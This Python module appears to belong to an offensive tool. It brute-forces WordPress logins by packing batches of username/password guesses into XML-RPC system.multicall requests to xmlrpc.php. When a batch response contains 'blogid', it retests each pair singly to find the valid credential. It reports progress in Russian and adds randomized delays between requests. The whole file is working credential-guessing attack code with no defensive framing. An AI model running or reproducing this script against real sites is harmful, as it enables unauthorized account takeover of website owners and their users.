# -*- coding: utf-8 -*-
import random
import time

from core import http, ui

CALL = ('<value><struct><member><name>methodName</name>'
        '<value><string>wp.getUsersBlogs</string></value></member>'
        '<member><name>params</name><value><array><data>'
        '<value><string>%s</string></value><value><string>%s</string></value>'
        '</data></array></value></member></struct></value>')

HEAD = ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
        '<params><param><value><array><data>')
TAIL = '</data></array></value></param></params></methodCall>'


def batch(host, pairs):
    body = HEAD + "".join(CALL % (u, p) for u, p in pairs) + TAIL
    try:
        r = http.post(host, "/xmlrpc.php", body, ctype="text/xml", timeout=25)
    except Exception:
        return None
    if r.status_code != 200:
        return None
    return r.text


def run_pairs(host, pairs, quiet=False):
    if not pairs:
        return ""
    i = 0
    while i < len(pairs):
        chunk = pairs[i:i + 10]
        out = batch(host, chunk)
        if out is None:
            return ""
        if "blogid" in out.lower():
            for u, p in chunk:
                single = HEAD + CALL % (u, p) + TAIL
                try:
                    r = http.post(host, "/xmlrpc.php", single, ctype="text/xml", timeout=20)
                except Exception:
                    continue
                if "blogid" in r.text.lower():
                    if not quiet:
                        ui.ok("ПОДОШЛО: %s / %s" % (u, p))
                    return "%s:%s" % (u, p)
                time.sleep(0.3)
        i += 10
        if not quiet:
            ui.say("проверено: %d" % min(i, len(pairs)))
        time.sleep(0.5 + random.random() * 0.5)
    return ""